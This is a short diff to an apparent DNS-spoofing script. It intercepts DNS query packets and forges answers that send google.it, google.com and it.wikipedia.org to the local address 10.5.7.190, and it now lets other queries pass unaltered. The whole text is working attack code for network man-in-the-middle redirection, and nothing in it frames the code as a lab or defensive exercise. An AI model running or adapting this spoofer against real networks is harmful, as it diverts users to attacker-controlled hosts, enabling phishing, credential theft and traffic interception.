@@ -7,8 +7,8 @@ dns_hosts = {
     b"www.google.it.": "10.5.7.190",
     b"google.it.": "10.5.7.190",
     b"www.google.com.": "10.5.7.190",
-    b"it.wikipedia.org.": "10.5.7.190",
-    b"b'dyna.wikimedia.org.": "10.5.7.190"
+    b"it.wikipedia.org": "10.5.7.190",
+    b"google.com.": "10.5.7.190"
 }
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
@@ -24,7 +24,10 @@ def process_packet(packet):
 
 def modify_packet(packet):
     qname = packet[DNSQR].qname
-    packet[DNS].an = DNSRR(rrname=qname, rdata="10.5.7.190")
+    if qname not in dns_hosts:
+        print("packet not:", qname)
+        return packet
+    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
     packet[DNS].ancount = 1
     del packet[IP].len
     del packet[IP].chksum
